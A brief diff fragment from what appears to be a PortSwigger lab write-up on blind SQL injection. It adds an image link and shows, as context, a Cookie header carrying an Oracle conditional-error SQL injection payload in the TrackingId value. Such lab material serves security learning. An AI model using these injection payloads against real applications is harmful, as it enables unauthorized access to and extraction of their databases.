@@ -75,3 +75,5 @@ Content-Length: 11458`
 ```sql
 Cookie: TrackingId=k2xQHAMjyOoJ8Iz4' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
 ```
+
+![PortSwigger](../Drawing/Drawing_25.png)
